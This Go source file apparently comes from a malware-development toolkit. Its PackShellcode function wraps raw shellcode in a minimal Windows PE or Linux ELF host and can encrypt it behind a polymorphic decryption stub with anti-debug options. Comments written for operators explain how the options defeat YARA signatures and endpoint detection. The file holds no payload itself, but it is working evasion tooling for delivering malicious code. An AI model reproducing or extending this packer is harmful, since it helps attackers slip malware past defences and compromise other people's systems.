package packer

import (
	"errors"
	"fmt"

	"github.com/oioio-space/maldev/pe/packer/transform"
)

// PackShellcode is the operator-facing entry point for turning raw
// position-independent shellcode into a runnable binary on the
// target OS, optionally encrypted with the same UPX-style stub
// pipeline [PackBinary] uses for Go-built inputs.
//
// Why this API exists alongside [PackBinary]:
//
//   - PackBinary requires a parseable PE / ELF input — it transforms
//     existing sections in place. It rejects raw bytes (msfvenom
//     output, hand-rolled stage-1) with ErrUnsupportedInputFormat
//     because there is no `.text` section to encrypt.
//   - PackShellcode wraps the bytes in a minimal host first
//     (transform.BuildMinimalPE32Plus or transform.BuildMinimalELF64WithSections)
//     so the OS loader runs the shellcode at the entry point. When
//     [PackShellcodeOptions.Encrypt] is true, the wrapped host then
//     flows through PackBinary for the polymorphic-stub envelope.
//
// Operational shapes:
//
//	plain (Encrypt=false): runnable binary, no decryption stub. The
//	  shellcode bytes sit at e_entry / AddressOfEntryPoint in
//	  cleartext. Fastest to build, lightest footprint, easiest to
//	  YARA. Use when the shellcode itself is already encrypted /
//	  obfuscated upstream, or when stealth is not the concern.
//
//	encrypted (Encrypt=true): runnable binary with an SGN-style
//	  decryption stub at the entry point. Stub decrypts the
//	  shellcode in place, then JMPs to it. ~3-8 KiB extra footprint
//	  for the stub. The wrapped binary is what real-world EDRs see.

// PackShellcodeOptions configures [PackShellcode].
type PackShellcodeOptions struct {
	// Format selects the host binary format:
	//   - FormatWindowsExe: PE32+ AMD64
	//   - FormatLinuxELF:   ELF64 AMD64 ET_EXEC, RWX PT_LOAD, with
	//     SHT (so PackBinary can chew on it when Encrypt=true)
	// FormatUnknown is rejected; operators MUST pick a target OS.
	Format Format

	// Encrypt, when true, runs the wrapped host through [PackBinary]
	// for SGN-style stub-driven decryption. Default false (plain wrap).
	Encrypt bool

	// ImageBase / Vaddr override the canonical load address:
	//   - Windows: PE ImageBase (must be 64K aligned). Zero =
	//     transform.MinimalPE32PlusImageBase (0x140000000).
	//   - Linux: ELF PT_LOAD vaddr (must be page-aligned). Zero =
	//     transform.MinimalELF64Vaddr (0x400000).
	// Per-build-tunable values defeat 'tiny PE/ELF at standard base'
	// yara rules.
	ImageBase uint64

	// Stage1Rounds, Seed, Key, AntiDebug, Compress are forwarded to
	// [PackBinary] when Encrypt is true. Ignored otherwise. Field
	// types mirror [PackBinaryOptions] exactly.
	Stage1Rounds int
	Seed         int64
	Key          []byte
	AntiDebug    bool
	Compress     bool
}

// ErrShellcodeEmpty fires on nil or zero-length shellcode input.
var ErrShellcodeEmpty = errors.New("packer: shellcode bytes empty")

// PackShellcode wraps `shellcode` in a minimal host PE/ELF and
// returns the runnable bytes. When opts.Encrypt is true, the result
// is also passed through [PackBinary] for stub-driven decryption.
//
// Returns the binary bytes + the AEAD key (only non-nil when
// Encrypt is true and the operator did not supply opts.Key) +
// error.
//
// Sentinels:
//   - [ErrShellcodeEmpty] — input is nil or zero-length.
//   - [ErrUnsupportedFormat] — opts.Format not one of FormatWindowsExe,
//     FormatLinuxELF.
func PackShellcode(shellcode []byte, opts PackShellcodeOptions) ([]byte, []byte, error) {
	if len(shellcode) == 0 {
		return nil, nil, ErrShellcodeEmpty
	}

	var wrapped []byte
	var err error
	switch opts.Format {
	case FormatWindowsExe:
		if opts.ImageBase != 0 {
			wrapped, err = transform.BuildMinimalPE32PlusWithBase(shellcode, opts.ImageBase)
		} else {
			wrapped, err = transform.BuildMinimalPE32Plus(shellcode)
		}
	case FormatLinuxELF:
		if opts.ImageBase != 0 {
			wrapped, err = transform.BuildMinimalELF64WithSectionsAndVaddr(shellcode, opts.ImageBase)
		} else {
			wrapped, err = transform.BuildMinimalELF64WithSections(shellcode)
		}
	default:
		return nil, nil, fmt.Errorf("%w: %s (PackShellcode requires FormatWindowsExe or FormatLinuxELF)",
			ErrUnsupportedFormat, opts.Format)
	}
	if err != nil {
		return nil, nil, fmt.Errorf("packer: wrap shellcode: %w", err)
	}

	if !opts.Encrypt {
		return wrapped, nil, nil
	}

	out, key, err := PackBinary(wrapped, PackBinaryOptions{
		Format:       opts.Format,
		Stage1Rounds: opts.Stage1Rounds,
		Seed:         opts.Seed,
		Key:          opts.Key,
		AntiDebug:    opts.AntiDebug,
		Compress:     opts.Compress,
	})
	if err != nil {
		return nil, nil, fmt.Errorf("packer: encrypt-wrap shellcode: %w", err)
	}
	return out, key, nil
}
